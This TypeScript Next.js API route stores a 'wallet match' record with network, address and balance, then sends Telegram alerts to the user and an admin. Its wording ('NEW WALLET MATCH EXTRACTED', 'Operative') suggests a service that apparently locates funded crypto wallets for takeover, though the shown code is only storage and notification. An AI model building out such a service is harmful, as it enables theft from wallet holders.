import { NextResponse } from 'next/server';
import { addExtraction, getUser } from '@/lib/db';
import { notifyUserWalletFound, notifyAdmin } from '@/bot';

export const dynamic = 'force-dynamic';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const {
      tgId,
      userName,
      network,
      walletAddress,
      balanceCrypto,
      balanceUsd,
      symbol,
      lang,
    } = body || {};

    if (!tgId || !network || !walletAddress) {
      return NextResponse.json({ ok: false, error: 'Missing required fields' }, { status: 400 });
    }

    const extraction = await addExtraction({
      tgId: String(tgId),
      userName: userName || 'User',
      network,
      walletAddress,
      balanceCrypto: Number(balanceCrypto || 0),
      balanceUsd: Number(balanceUsd || 0),
      symbol: symbol || '',
    });

    // Notify user via Telegram Bot in their language
    const user = await getUser(String(tgId));
    const effectiveLang = lang || user?.lang || 'en';

    const shortened = walletAddress.length > 12
      ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
      : walletAddress;

    notifyUserWalletFound(String(tgId), {
      network,
      shortenedAddr: shortened,
      balanceCrypto: balanceCrypto ?? '—',
      symbol: symbol || '',
      balanceUsd: Number(balanceUsd || 0),
    }, effectiveLang).catch((e) => console.error('[Bot Alert] Wallet found user notify failed:', e?.message));

    // Notify Admin
    notifyAdmin(
      `🎯 <b>[NEW WALLET MATCH EXTRACTED]</b>\n\n` +
      `👤 <b>Operative:</b> ${userName || 'User'} (<code>${tgId}</code>)\n` +
      `🌐 <b>Network:</b> ${network}\n` +
      `📍 <b>Address:</b> <code>${walletAddress}</code>\n` +
      `💵 <b>Value:</b> $${Number(balanceUsd || 0).toLocaleString()} (${balanceCrypto} ${symbol})`
    ).catch(() => {});

    return NextResponse.json({ ok: true, extraction });
  } catch (err: any) {
    console.error('Error in /api/extractions/record:', err?.message || err);
    return NextResponse.json({ ok: false, error: err?.message || 'Server error' }, { status: 500 });
  }
}
